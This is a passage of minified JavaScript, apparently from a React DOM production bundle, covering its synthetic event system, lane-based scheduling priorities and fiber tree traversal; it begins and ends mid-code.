Gp(e,t){if(t){if(xM[e]&&(null!=t.children||null!=t.dangerouslySetInnerHTML))throw Error(U(137,e));if(null!=t.dangerouslySetInnerHTML){if(null!=t.children)throw Error(U(60));if("object"!=typeof t.dangerouslySetInnerHTML||!("__html"in t.dangerouslySetInnerHTML))throw Error(U(61))}if(null!=t.style&&"object"!=typeof t.style)throw Error(U(62))}}function Hp(e,t){if(-1===e.indexOf("-"))return"string"==typeof t.is;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Kp=null;function Pg(e){return(e=e.target||e.srcElement||window).correspondingUseElement&&(e=e.correspondingUseElement),3===e.nodeType?e.parentNode:e}var Qp=null,Fo=null,Vo=null;function H0(e){if(e=Su(e)){if("function"!=typeof Qp)throw Error(U(280));var t=e.stateNode;t&&(t=pd(t),Qp(e.stateNode,e.type,t))}}function x_(e){Fo?Vo?Vo.push(e):Vo=[e]:Fo=e}function I_(){if(Fo){var e=Fo,t=Vo;if(Vo=Fo=null,H0(e),t)for(e=0;e<t.length;e++)H0(t[e])}}function k_(e,t){return e(t)}function D_(){}var zf=!1;function C_(e,t,n){if(zf)return e(t,n);zf=!0;try{return k_(e,t,n)}finally{zf=!1,(null!==Fo||null!==Vo)&&(D_(),I_())}}function Pl(e,t){var n=e.stateNode;if(null===n)return null;var r=pd(n);if(null===r)return null;n=r[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(r=!("button"===(e=e.type)||"input"===e||"select"===e||"textarea"===e)),e=!r;break e;default:e=!1}if(e)return null;if(n&&"function"!=typeof n)throw Error(U(231,t,typeof n));return n}var Xp=!1;if(jr)try{var Ua={};Object.defineProperty(Ua,"passive",{get:function(){Xp=!0}}),window.addEventListener("test",Ua,Ua),window.removeEventListener("test",Ua,Ua)}catch{Xp=!1}function IM(e,t,n,r,i,s,o,a,l){var u=Array.prototype.slice.call(arguments,3);try{t.apply(n,u)}catch(e){this.onError(e)}}var ml=!1,ch=null,hh=!1,Jp=null,kM={onError:function(e){ml=!0,ch=e}};function DM(e,t,n,r,i,s,o,a,l){ml=!1,ch=null,IM.apply(kM,arguments)}function CM(e,t,n,r,i,s,o,a,l){if(DM.apply(this,arguments),ml){if(!ml)throw Error(U(198));var u=ch;ml=!1,ch=null,hh||(hh=!0,Jp=u)}}function Qs(e){var t=e,n=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do{4098&(t=e).flags&&(n=t.return),e=t.return}while(e)}return 3===t.tag?n:null}function N_(e){if(13===e.tag){var t=e.memoizedState;if(null===t&&(null!==(e=e.alternate)&&(t=e.memoizedState)),null!==t)return t.dehydrated}return null}function K0(e){if(Qs(e)!==e)throw Error(U(188))}function NM(e){var t=e.alternate;if(!t){if(null===(t=Qs(e)))throw Error(U(188));return t!==e?null:e}for(var n=e,r=t;;){var i=n.return;if(null===i)break;var s=i.alternate;if(null===s){if(null!==(r=i.return)){n=r;continue}break}if(i.child===s.child){for(s=i.child;s;){if(s===n)return K0(i),e;if(s===r)return K0(i),t;s=s.sibling}throw Error(U(188))}if(n.return!==r.return)n=i,r=s;else{for(var o=!1,a=i.child;a;){if(a===n){o=!0,n=i,r=s;break}if(a===r){o=!0,r=i,n=s;break}a=a.sibling}if(!o){for(a=s.child;a;){if(a===n){o=!0,n=s,r=i;break}if(a===r){o=!0,r=s,n=i;break}a=a.sibling}if(!o)throw Error(U(189))}}if(n.alternate!==r)throw Error(U(190))}if(3!==n.tag)throw Error(U(188));return n.stateNode.current===n?e:t}function M_(e){return null!==(e=NM(e))?R_(e):null}function R_(e){if(5===e.tag||6===e.tag)return e;for(e=e.child;null!==e;){var t=R_(e);if(null!==t)return t;e=e.sibling}return null}var A_=Mn.unstable_scheduleCallback,Q0=Mn.unstable_cancelCallback,MM=Mn.unstable_shouldYield,RM=Mn.unstable_requestPaint,pt=Mn.unstable_now,AM=Mn.unstable_getCurrentPriorityLevel,$g=Mn.unstable_ImmediatePriority,b_=Mn.unstable_UserBlockingPriority,dh=Mn.unstable_NormalPriority,bM=Mn.unstable_LowPriority,O_=Mn.unstable_IdlePriority,cd=null,gr=null;function OM(e){if(gr&&"function"==typeof gr.onCommitFiberRoot)try{gr.onCommitFiberRoot(cd,e,void 0,128==(128&e.current.flags))}catch{}}var tr=Math.clz32?Math.clz32:LM,PM=Math.log,$M=Math.LN2;function LM(e){return 0===(e>>>=0)?32:31-(PM(e)/$M|0)|0}var fc=64,pc=4194304;function sl(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return 4194240&e;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return 130023424&e;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function fh(e,t){var n=e.pendingLanes;if(0===n)return 0;var r=0,i=e.suspendedLanes,s=e.pingedLanes,o=268435455&n;if(0!==o){var a=o&~i;0!==a?r=sl(a):0!==(s&=o)&&(r=sl(s))}else 0!==(o=n&~i)?r=sl(o):0!==s&&(r=sl(s));if(0===r)return 0;if(0!==t&&t!==r&&!(t&i)&&((i=r&-r)>=(s=t&-t)||16===i&&0!=(4194240&s)))return t;if(4&r&&(r|=16&n),0!==(t=e.entangledLanes))for(e=e.entanglements,t&=r;0<t;)i=1<<(n=31-tr(t)),r|=e[n],t&=~i;return r}function FM(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:default:return-1}}function VM(e,t){for(var n=e.suspendedLanes,r=e.pingedLanes,i=e.expirationTimes,s=e.pendingLanes;0<s;){var o=31-tr(s),a=1<<o,l=i[o];-1===l?(!(a&n)||a&r)&&(i[o]=FM(a,t)):l<=t&&(e.expiredLanes|=a),s&=~a}}function Zp(e){return 0!==(e=-1073741825&e.pendingLanes)?e:1073741824&e?1073741824:0}function P_(){var e=fc;return!(4194240&(fc<<=1))&&(fc=64),e}function Bf(e){for(var t=[],n=0;31>n;n++)t.push(e);return t}function vu(e,t,n){e.pendingLanes|=t,536870912!==t&&(e.suspendedLanes=0,e.pingedLanes=0),(e=e.eventTimes)[t=31-tr(t)]=n}function UM(e,t){var n=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var r=e.eventTimes;for(e=e.expirationTimes;0<n;){var i=31-tr(n),s=1<<i;t[i]=0,r[i]=-1,e[i]=-1,n&=~s}}function Lg(e,t){var n=e.entangledLanes|=t;for(e=e.entanglements;n;){var r=31-tr(n),i=1<<r;i&t|e[r]&t&&(e[r]|=t),n&=~i}}var be=0;function $_(e){return 1<(e&=-e)?4<e?268435455&e?16:536870912:4:1}var L_,Fg,F_,V_,U_,em=!1,mc=[],_i=null,Ei=null,Ti=null,$l=new Map,Ll=new Map,di=[],zM="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function X0(e,t){switch(e){case"focusin":case"focusout":_i=null;break;case"dragenter":case"dragleave":Ei=null;break;case"mouseover":case"mouseout":Ti=null;break;case"pointerover":case"pointerout":$l.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":Ll.delete(t.pointerId)}}function za(e,t,n,r,i,s){return null===e||e.nativeEvent!==s?(e={blockedOn:t,domEventName:n,eventSystemFlags:r,nativeEvent:s,targetContainers:[i]},null!==t&&(null!==(t=Su(t))&&Fg(t)),e):(e.eventSystemFlags|=r,t=e.targetContainers,null!==i&&-1===t.indexOf(i)&&t.push(i),e)}function BM(e,t,n,r,i){switch(t){case"focusin":return _i=za(_i,e,t,n,r,i),!0;case"dragenter":return Ei=za(Ei,e,t,n,r,i),!0;case"mouseover":return Ti=za(Ti,e,t,n,r,i),!0;case"pointerover":var s=i.pointerId;return $l.set(s,za($l.get(s)||null,e,t,n,r,i)),!0;case"gotpointercapture":return s=i.pointerId,Ll.set(s,za(Ll.get(s)||null,e,t,n,r,i)),!0}return!1}function z_(e){var t=Ss(e.target);if(null!==t){var n=Qs(t);if(null!==n)if(13===(t=n.tag)){if(null!==(t=N_(n)))return e.blockedOn=t,void U_(e.priority,(function(){F_(n)}))}else if(3===t&&n.stateNode.current.memoizedState.isDehydrated)return void(e.blockedOn=3===n.tag?n.stateNode.containerInfo:null)}e.blockedOn=null}function qc(e){if(null!==e.blockedOn)return!1;for(var t=e.targetContainers;0<t.length;){var n=tm(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(null!==n)return null!==(t=Su(n))&&Fg(t),e.blockedOn=n,!1;var r=new(n=e.nativeEvent).constructor(n.type,n);Kp=r,n.target.dispatchEvent(r),Kp=null,t.shift()}return!0}function J0(e,t,n){qc(e)&&n.delete(t)}function jM(){em=!1,null!==_i&&qc(_i)&&(_i=null),null!==Ei&&qc(Ei)&&(Ei=null),null!==Ti&&qc(Ti)&&(Ti=null),$l.forEach(J0),Ll.forEach(J0)}function Ba(e,t){e.blockedOn===t&&(e.blockedOn=null,em||(em=!0,Mn.unstable_scheduleCallback(Mn.unstable_NormalPriority,jM)))}function Fl(e){function t(t){return Ba(t,e)}if(0<mc.length){Ba(mc[0],e);for(var n=1;n<mc.length;n++){var r=mc[n];r.blockedOn===e&&(r.blockedOn=null)}}for(null!==_i&&Ba(_i,e),null!==Ei&&Ba(Ei,e),null!==Ti&&Ba(Ti,e),$l.forEach(t),Ll.forEach(t),n=0;n<di.length;n++)(r=di[n]).blockedOn===e&&(r.blockedOn=null);for(;0<di.length&&null===(n=di[0]).blockedOn;)z_(n),null===n.blockedOn&&di.shift()}var Uo=Qr.ReactCurrentBatchConfig,ph=!0;function qM(e,t,n,r){var i=be,s=Uo.transition;Uo.transition=null;try{be=1,Vg(e,t,n,r)}finally{be=i,Uo.transition=s}}function YM(e,t,n,r){var i=be,s=Uo.transition;Uo.transition=null;try{be=4,Vg(e,t,n,r)}finally{be=i,Uo.transition=s}}function Vg(e,t,n,r){if(ph){var i=tm(e,t,n,r);if(null===i)Jf(e,t,r,mh,n),X0(e,r);else if(BM(i,e,t,n,r))r.stopPropagation();else if(X0(e,r),4&t&&-1<zM.indexOf(e)){for(;null!==i;){var s=Su(i);if(null!==s&&L_(s),null===(s=tm(e,t,n,r))&&Jf(e,t,r,mh,n),s===i)break;i=s}null!==i&&r.stopPropagation()}else Jf(e,t,r,null,n)}}var mh=null;function tm(e,t,n,r){if(mh=null,null!==(e=Ss(e=Pg(r))))if(null===(t=Qs(e)))e=null;else if(13===(n=t.tag)){if(null!==(e=N_(t)))return e;e=null}else if(3===n){if(t.stateNode.current.memoizedState.isDehydrated)return 3===t.tag?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return mh=e,null}function B_(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(AM()){case $g:return 1;case b_:return 4;case dh:case bM:return 16;case O_:return 536870912;default:return 16}default:return 16}}var gi=null,Ug=null,Yc=null;function j_(){if(Yc)return Yc;var e,t,n=Ug,r=n.length,i="value"in gi?gi.value:gi.textContent,s=i.length;for(e=0;e<r&&n[e]===i[e];e++);var o=r-e;for(t=1;t<=o&&n[r-t]===i[s-t];t++);return Yc=i.slice(e,1<t?1-t:void 0)}function Wc(e){var t=e.keyCode;return"charCode"in e?0===(e=e.charCode)&&13===t&&(e=13):e=t,10===e&&(e=13),32<=e||13===e?e:0}function gc(){return!0}function Z0(){return!1}function On(e){function t(t,n,r,i,s){for(var o in this._reactName=t,this._targetInst=r,this.type=n,this.nativeEvent=i,this.target=s,this.currentTarget=null,e)e.hasOwnProperty(o)&&(t=e[o],this[o]=t?t(i):i[o]);return this.isDefaultPrevented=(null!=i.defaultPrevented?i.defaultPrevented:!1===i.returnValue)?gc:Z0,this.isPropagationStopped=Z0,this}return st(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var e=this.nativeEvent;e&&(e.preventDefault?e.preventDefault():"unknown"!=typeof e.returnValue&&(e.returnValue=!1),this.isDefaultPrevented=gc)},stopPropagation:function(){var e=this.nativeEvent;e&&(e.stopPropagation?e.stopPropagation():"unknown"!=typeof e.cancelBubble&&(e.cancelBubble=!0),this.isPropagationStopped=gc)},persist:function(){},isPersistent:gc}),t}var jf,qf,ja,ya={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},zg=On(ya),wu=st({},ya,{view:0,detail:0}),WM=On(wu),hd=st({},wu,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Bg,button:0,buttons:0,relatedTarget:function(e){return void 0===e.relatedTarget?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==ja&&(ja&&"mousemove"===e.type?(jf=e.screenX-ja.screenX,qf=e.screenY-ja.screenY):qf=jf=0,ja=e),jf)},movementY:function(e){return"movementY"in e?e.movementY:qf}}),e1=On(hd),GM=st({},hd,{dataTransfer:0}),HM=On(GM),KM=st({},wu,{relatedTarget:0}),Yf=On(KM),QM=st({},ya,{animationName:0,elapsedTime:0,pseudoElement:0}),XM=On(QM),JM=st({},ya,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),ZM=On(JM),eR=st({},ya,{data:0}),t1=On(eR),tR={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},nR={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},rR={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function iR(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):!!(e=rR[e])&&!!t[e]}function Bg(){return iR}var sR=st({},wu,{key:function(e){if(e.key){var t=tR[e.key]||e.key;if("Unidentified"!==t)return t}return"keypress"===e.type?13===(e=Wc(e))?"Enter":String.fromCharCode(e):"keydown"===e.type||"keyup"===e.type?nR[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Bg,charCode:function(e){return"keypress"===e.type?Wc(e):0},keyCode:function(e){return"keydown"===e.type||"keyup"===e.type?e.keyCode:0},which:function(e){return"keypress"===e.type?Wc(e):"keydown"===e.type||"keyup"===e.type?e.keyCode:0}}),oR=On(sR),aR=st({},hd,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),n1=On(aR),lR=st({},wu,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Bg}),uR=On(lR),cR=st({},ya,{propertyName:0,elapsedTime:0,pseudoElement:0}),hR=On(cR),dR=st({},hd,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),fR=On(dR),pR=[9,13,27,32],jg=jr&&"CompositionEvent"in window,gl=null;jr&&"documentMode"in document&&(gl=document.documentMode);var mR=jr&&"TextEvent"in window&&!gl,q_=jr&&(!jg||gl&&8<gl&&11>=gl),r1=String.fromCharCode(32),i1=!1;function Y_(e,t){switch(e){case"keyup":return-1!==pR.indexOf(t.keyCode);case"keydown":return 229!==t.keyCode;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function W_(e){return"object"==typeof(e=e.detail)&&"data"in e?e.data:null}var xo=!1;function gR(e,t){switch(e){case"compositionend":return W_(t);case"keypress":return 32!==t.which?null:(i1=!0,r1);case"textInput":return(e=t.data)===r1&&i1?null:e;default:return null}}function yR(e,t){if(xo)return"compositionend"===e||!jg&&Y_(e,t)?(e=j_(),Yc=Ug=gi=null,xo=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return q_&&"ko"!==t.locale?null:t.data;default:return null}}var vR={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function s1(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return"input"===t?!!vR[e.type]:"textarea"===t}function G_(e,t,n,r){x_(r),0<(t=gh(t,"onChange")).length&&(n=new zg("onChange","change",null,n,r),e.push({event:n,listeners:t}))}var yl=null,Vl=null;function wR(e){iE(e,0)}function dd(e){if(y_(Do(e)))return e}function SR(e,t){if("change"===e)return t}var H_=!1;if(jr){var Wf;if(jr){var Gf="oninput"in document;if(!Gf){var o1=document.createElement("div");o1.setAttribute("oninput","return;"),Gf="function"==typeof o1.oninput}Wf=Gf}else Wf=!1;H_=Wf&&(!document.documentMode||9<document.documentMode)}function a1(){yl&&(yl.detachEvent("onpropertychange",K_),Vl=yl=null)}function K_(e){if("value"===e.propertyName&&dd(Vl)){var t=[];G_(t,Vl,e,Pg(e)),C_(wR,t)}}function _R(e,t,n){"focusin"===e?(a1(),Vl=n,(yl=t).attachEvent("onpropertychange",K_)):"focusout"===e&&a1()}function ER(e){if("selectionchange"===e||"keyup"===e||"keydown"===e)return dd(Vl)}function TR(e,t){if("click"===e)return dd(t)}function xR(e,t){if("input"===e||"change"===e)return dd(t)}function IR(e,t){return e===t&&(0!==e||1/e==1/t)||e!=e&&t!=t}var rr="function"==typeof Object.is?Object.is:IR;function Ul(e,t){if(rr(e,t))return!0;if("object"!=typeof e||null===e||"object"!=typeof t||null===t)return!1;var n=Object.keys(e),r=Object.keys(t);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var i=n[r];if(!Lp.call(t,i)||!rr(e[i],t[i]))return!1}return!0}function l1(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function u1(e,t){var n,r=l1(e);for(e=0;r;){if(3===r.nodeType){if(n=e+r.textContent.length,e<=t&&n>=t)return{node:r,offset:t-e};e=n}e:{for(;r;){if(r.nextSibling){r=r.nextSibling;break e}r=r.parentNode}r=void 0}r=l1(r)}}function Q_(e,t){return!(!e||!t)&&(e===t||(!e||3!==e.nodeType)&&(t&&3===t.nodeType?Q_(e,t.parentNode):"contains"in e?e.contains(t):!!e.compareDocumentPosition&&!!(16&e.compareDocumentPosition(t))))}function X_(){for(var e=window,t=uh();t instanceof e.HTMLIFrameElement;){try{var n="string"==typeof t.contentWindow.location.href}catch{n=!1}if(!n)break;t=uh((e=t.contentWindow).document)}return t}function qg(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&("input"===t&&("text"===e.type||"search"===e.type||"tel"===e.type||"url"===e.type||"password"===e.type)||"textarea"===t||"true"===e.contentEditable)}function kR(e){var t=X_(),n=e.focusedElem,r=e.selectionRange;if(t!==n&&n&&n.ownerDocument&&Q_(n.ownerDocument.documentElement,n)){if(null!==r&&qg(n))if(t=r.start,void 0===(e=r.end)&&(e=t),"selectionStart"in n)n.selectionStart=t,n.selectionEnd=Math.min(e,n.value.length);else if((e=(t=n.ownerDocument||document)&&t.defaultView||window).getSelection){e=e.getSelection();var i=n.textContent.length,s=Math.min(r.start,i);r=void 0===r.end?s:Math.min(r.end,i),!e.extend&&s>r&&(i=r,r=s,s=i),i=u1(n,s);var o=u1(n,r);i&&o&&(1!==e.rangeCount||e.anchorNode!==i.node||e.anchorOffset!==i.offset||e.focusNode!==o.node||e.focusOffset!==o.offset)&&((t=t.createRange()).setStart(i.node,i.offset),e.removeAllRanges(),s>r?(e.addRange(t),e.extend(o.node,o.offset)):(t.setEnd(o.node,o.offset),e.addRange(t)))}for(t=[],e=n;e=e.parentNode;)1===e.nodeType&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for("function"==typeof n.focus&&n.focus(),n=0;n<t.length;n++)(e=t[n]).element.scrollLeft=e.left,e.element.scrollTop=e.top}}var DR=jr&&"documentMode"in document&&11>=document.documentMode,Io=null,nm=null,vl=null,rm=!1;function c1(e,t,n){var r=n.window===n?n.document:9===n.nodeType?n:n.ownerDocument;rm||null==Io||Io!==uh(r)||("selectionStart"in(r=Io)&&qg(r)?r={start:r.selectionStart,end:r.selectionEnd}:r={anchorNode:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection()).anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset},vl&&Ul(vl,r)||(vl=r,0<(r=gh(nm,"onSelect")).length&&(t=new zg("onSelect","select",null,t,n),e.push({event:t,listeners:r}),t.target=Io)))}function yc(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n["Webkit"+e]="webkit"+t,n["Moz"+e]="moz"+t,n}var ko={animationend:yc("Animation","AnimationEnd"),animationiteration:yc("Animation","AnimationIteration"),animationstart:yc("Animation","AnimationStart"),transitionend:yc("Transition","TransitionEnd")},Hf={},J_={};function fd(e){if(Hf[e])return Hf[e];if(!ko[e])return e;var t,n=ko[e];for(t in n)if(n.hasOwnProperty(t)&&t in J_)return Hf[e]=n[t];return e}jr&&(J_=document.createElement("div").style,"AnimationEvent"in window||(delete ko.animationend.animation,delete ko.animationiteration.animation,delete ko.animationstart.animation),"TransitionEvent"in window||delete ko.transitionend.transition);var Z_=fd("animationend"),eE=fd("animationiteration"),tE=fd("animationstart"),nE=fd("transitionend"),rE=new Map,h1="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Yi(e,t){rE.set(e,t),Ks(t,[e])}for(var Kf=0;Kf<h1.length;Kf++){var Qf=h1[Kf],CR=Qf.toLowerCase(),NR=Qf[0].toUpperCase()+Qf.slice(1);Yi(CR,"on"+NR)}Yi(Z_,"onAnimationEnd"),Yi(eE,"onAnimationIteration"),Yi(tE,"onAnimationStart"),Yi("dblclick","onDoubleClick"),Yi("focusin","onFocus"),Yi("focusout","onBlur"),Yi(nE,"onTransitionEnd"),Ho("onMouseEnter",["mouseout","mouseover"]),Ho("onMouseLeave",["mouseout","mouseover"]),Ho("onPointerEnter",["pointerout","pointerover"]),Ho("onPointerLeave",["pointerout","pointerover"]),Ks("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),Ks("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),Ks("onBeforeInput",["compositionend","keypress","textInput","paste"]),Ks("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),Ks("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),Ks("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var ol="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),MR=new Set("cancel close invalid load scroll toggle".split(" ").concat(ol));function d1(e,t,n){var r=e.type||"unknown-event";e.currentTarget=n,CM(r,t,void 0,e),e.currentTarget=null}function iE(e,t){t=0!=(4&t);for(var n=0;n<e.length;n++){var r=e[n],i=r.event;r=r.listeners;e:{var s=void 0;if(t)for(var o=r.length-1;0<=o;o--){var a=r[o],l=a.instance,u=a.currentTarget;if(a=a.listener,l!==s&&i.isPropagationStopped())break e;d1(i,a,u),s=l}else for(o=0;o<r.length;o++){if(l=(a=r[o]).instance,u=a.currentTarget,a=a.listener,l!==s&&i.isPropagationStopped())break e;d1(i,a,u),s=l}}}if(hh)throw e=Jp,hh=!1,Jp=null,e}function Ye(e,t){var n=t[lm];void 0===n&&(n=t[lm]=new Set);var r=e+"__bubble";n.has(r)||(sE(t,e,2,!1),n.add(r))}function Xf(e,t,n){var r=0;t&&(r|=4),sE(n,e,r,t)}var vc="_reactListening"+Math.random().toString(36).slice(2);function zl(e){if(!e[vc]){e[vc]=!0,d_.forEach((function(t){"selectionchange"!==t&&(MR.has(t)||Xf(t,!1,e),Xf(t,!0,e))}));var t=9===e.nodeType?e:e.ownerDocument;null===t||t[vc]||(t[vc]=!0,Xf("selectionchange",!1,t))}}function sE(e,t,n,r){switch(B_(t)){case 1:var i=qM;break;case 4:i=YM;break;default:i=Vg}n=i.bind(null,t,n,e),i=void 0,!Xp||"touchstart"!==t&&"touchmove"!==t&&"wheel"!==t||(i=!0),r?void 0!==i?e.addEventListener(t,n,{capture:!0,passive:i}):e.addEventListener(t,n,!0):void 0!==i?e.addEventListener(t,n,{passive:i}):e.addEventListener(t,n,!1)}function Jf(e,t,n,r,i){var s=r;if(!(1&t||2&t||null===r))e:for(;;){if(null===r)return;var o=r.tag;if(3===o||4===o){var a=r.stateNode.containerInfo;if(a===i||8===a.nodeType&&a.parentNode===i)break;if(4===o)for(o=r.return;null!==o;){var l=o.tag;if((3===l||4===l)&&((l=o.stateNode.containerInfo)===i||8===l.nodeType&&l.parentNode===i))return;o=o.return}for(;null!==a;){if(null===(o=Ss(a)))return;if(5===(l=o.tag)||6===l){r=s=o;continue e}a=a.parentNode}}r=r.return}C_((function(){var r=s,i=Pg(n),o=[];e:{var a=rE.get(e);if(void 0!==a){var l=zg,u=e;switch(e){case"keypress":if(0===Wc(n))break e;case"keydown":case"keyup":l=oR;break;case"focusin":u="focus",l=Yf;break;case"focusout":u="blur",l=Yf;break;case"beforeblur":case"afterblur":l=Yf;break;case"click":if(2===n.button)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":l=e1;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":l=HM;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":l=uR;break;case Z_:case eE:case tE:l=XM;break;case nE:l=hR;break;case"scroll":l=WM;break;case"wheel":l=fR;break;case"copy":case"cut":case"paste":l=ZM;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":l=n1}var c=0!=(4&t),h=!c&&"scroll"===e,d=c?null!==a?a+"Capture":null:a;c=[];for(var f,p=r;null!==p;){var m=(f=p).stateNode;if(5===f.tag&&null!==m&&(f=m,null!==d&&(null!=(m=Pl(p,d))&&c.push(Bl(p,m,f)))),h)break;p=p.return}0<c.length&&(a=new 